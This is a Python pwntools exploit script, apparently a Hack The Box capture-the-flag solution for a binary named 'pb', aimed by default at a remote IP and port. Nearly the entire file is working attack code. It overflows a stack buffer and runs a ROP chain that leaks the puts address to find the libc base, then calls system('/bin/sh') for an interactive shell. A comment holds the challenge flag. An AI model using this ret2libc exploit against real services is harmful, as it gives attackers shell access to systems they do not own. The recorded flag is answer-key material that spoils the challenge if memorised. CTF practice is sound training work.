#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 123 ./pb
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./pb')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '178.128.172.102'
port = int(args.PORT or 31432)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x00000000004013a4
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  './glibc/'

libc = exe.libc
io = start()
pop_rdi = 0x000000000040142b
io.sendlineafter('>> ','2')

p = 'a'*0x38
p += p64(pop_rdi)
p += p64(exe.got['puts'])
p += p64(exe.plt['puts'])
p += p64(exe.sym['main'])
io.sendlineafter(': ',p)

io.recvline()
io.recvline()
io.recvline()

leak = u64(io.recvline()[:-1]+'\x00\x00')
libc.address = leak - libc.sym['puts']
print hex(libc.address)

io.sendlineafter('>> ','2')

p = 'a'*0x38
p += p64(pop_rdi+1)
p += p64(pop_rdi)
p += p64(libc.search("/bin/sh\x00").next())
# p += p64(exe.plt['puts'])
p += p64(libc.sym['system'])
io.sendlineafter(': ',p)
# HTB{r3turn_2_P4nd0r4?!}
io.interactive()

